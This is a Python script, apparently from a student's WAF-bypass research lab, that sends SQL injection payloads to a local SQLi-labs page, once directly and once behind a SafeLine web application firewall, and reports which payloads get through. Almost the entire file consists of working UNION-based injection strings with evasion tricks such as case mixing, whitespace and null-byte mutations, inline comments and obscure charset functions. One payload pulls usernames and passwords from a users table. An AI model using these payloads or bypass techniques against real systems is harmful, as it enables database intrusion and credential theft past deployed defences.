"""
bypass_lab/test_using2.py
==========================
Test hipotesis: apakah INVALID syntax (database() USING utf8)
pass Safeline, sementara VALID equivalent-nya (CONVERT) diblok?

Kalau iya, artinya Safeline gagal parse invalid SQL → tidak classify sebagai injection.
Kita perlu cari syntax yang INVALID di mata Safeline tapi VALID di MySQL.

Run:
    python3 -m bypass_lab.test_using2
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"
M     = "'SEQSQLI_START','SEQSQLI_END'"
FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    plain_ok  = classify_response(rp.text, rp.status_code, "union", strict_markers=True) == "SUCCESS"
    plain_err = "syntax" in rp.text.lower() or "error" in rp.text.lower()
    waf_pass  = rw.status_code != 403
    waf_ok    = classify_response(rw.text, rw.status_code, "union", strict_markers=True) == "SUCCESS"

    plain_tag = "SQL_OK" if plain_ok else ("SQL_ERR" if plain_err else "NODATA")
    waf_tag   = "BYPASS!" if waf_ok else ("PASS(no_data)" if waf_pass else "BLOCK")

    star = " ←←← !!!" if waf_pass else ""
    print(f"  plain={plain_tag:<10} waf={waf_tag:<18} | {label}{star}")

    if waf_ok:
        FOUND.append(("BYPASS", label, payload))
    elif waf_pass:
        FOUND.append(("WAF_PASS", label, payload))

    time.sleep(0.25)


print("=" * 65)
print(" Test: invalid USING syntax vs valid equivalents")
print("=" * 65)

# ── 1. Payload user asli — INVALID syntax ─────────────────────────────
print("\n[1] Payload user — USING langsung (invalid MySQL syntax)")
t("USING utf8 (user payload)",
  f"-1' UNION SELECT database() USING utf8,{M}-- -")
t("USING utf8mb4",
  f"-1' UNION SELECT database() USING utf8mb4,{M}-- -")
t("USING latin1",
  f"-1' UNION SELECT database() USING latin1,{M}-- -")
t("USING binary",
  f"-1' UNION SELECT database() USING binary,{M}-- -")
t("USING utf8 all cols",
  f"-1' UNION SELECT database() USING utf8,'SEQSQLI_START' USING utf8,'SEQSQLI_END' USING utf8-- -")

# ── 2. Variasi posisi USING ───────────────────────────────────────────
print("\n[2] USING di posisi berbeda")
t("USING setelah semua SELECT",
  f"-1' UNION SELECT database(),'X','Y' USING utf8-- -")
t("USING sebelum FROM dalam subquery",
  f"-1' UNION SELECT (SELECT database() USING utf8),'X','Y'-- -")
t("USING dalam WHERE",
  f"-1' UNION SELECT database(),'X','Y' WHERE 1=1 USING utf8-- -")

# ── 3. CHARSET/COLLATION functions (less common, not in training?) ────
print("\n[3] CHARSET() dan COLLATION() — obscure MySQL functions")
t("CHARSET(database())",
  f"-1' UNION SELECT CHARSET(database()),{M}-- -")
t("COLLATION(database())",
  f"-1' UNION SELECT COLLATION(database()),{M}-- -")
t("CHARSET+COLLATION combo",
  f"-1' UNION SELECT CONCAT(database(),CHARSET(database())),{M}-- -")
t("WEIGHT_STRING",
  f"-1' UNION SELECT WEIGHT_STRING(database()),{M}-- -")

# ── 4. Type conversion functions ──────────────────────────────────────
print("\n[4] Type conversion — CONVERT(x, type) syntax")
t("CONVERT(x, CHAR)",
  f"-1' UNION SELECT CONVERT(database(),CHAR),{M}-- -")
t("CONVERT(x, BINARY)",
  f"-1' UNION SELECT CONVERT(database(),BINARY),{M}-- -")
t("CONVERT(x, CHAR(100))",
  f"-1' UNION SELECT CONVERT(database(),CHAR(100)),{M}-- -")

# ── 5. Combine invalid USING + other tricks ───────────────────────────
print("\n[5] Invalid USING + mutation combos")
t("USING + case",
  f"-1' uNiOn sElEcT database() USING utf8,{M}-- -")
t("USING + tab",
  f"-1'\tUNION\tSELECT\tdatabase() USING utf8,{M}-- -")
t("USING + newline",
  f"-1'\nUNION\nSELECT\ndatabase() USING utf8,{M}-- -")
t("USING + null_byte",
  f"-1' UNION SELECT database() USING utf8,{M};\x00")
t("USING + float_noise",
  f"-1'.6e0 UNION SELECT database() USING utf8,{M}-- -")
t("USING + comment",
  f"-1' UNION/**/SELECT/**/database() USING utf8,{M}-- -")

# ── 6. USING dalam subquery context ──────────────────────────────────
print("\n[6] JOIN USING yang valid untuk exfil data")
t("JOIN USING valid — users tabel",
  f"-1' UNION SELECT u1.username,u1.password,'end' "
  f"FROM users u1 JOIN users u2 USING(id) WHERE u1.id=1-- -")
t("JOIN USING — database extraction via WHERE",
  f"-1' UNION SELECT 1,2,3 FROM (SELECT 1) t "
  f"WHERE (SELECT database())='security'-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
bypasses = [x for x in FOUND if x[0] == "BYPASS"]
passes   = [x for x in FOUND if x[0] == "WAF_PASS"]
print(f" BYPASS (data confirmed): {len(bypasses)}")
print(f" WAF PASS (no data yet):  {len(passes)}")
for tag, label, p in FOUND:
    print(f"\n  [{tag}] {label}")
    print(f"  {p[:100]}")
